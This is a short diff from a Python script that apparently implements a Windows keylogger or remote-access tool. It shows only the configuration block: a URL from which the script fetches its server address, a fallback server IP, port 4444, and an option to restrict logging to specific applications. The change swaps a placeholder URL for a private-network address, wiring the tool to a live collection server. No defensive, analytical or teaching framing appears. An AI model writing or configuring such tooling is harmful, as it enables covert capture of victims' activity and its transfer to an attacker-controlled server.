@@ -24,7 +24,7 @@ import win32process
 import winreg
 
 # --- Configuration ---
-CONFIG_URL = 'http://your-server.com/config.txt'  # URL to fetch server IP from
+CONFIG_URL = 'http://192.168.100.9:8000/config.txt'  # URL to fetch server IP from
 SERVER_HOST = '192.168.100.9'  # Fallback server IP
 SERVER_PORT = 4444
 # Optional: Restrict logging to specific applications
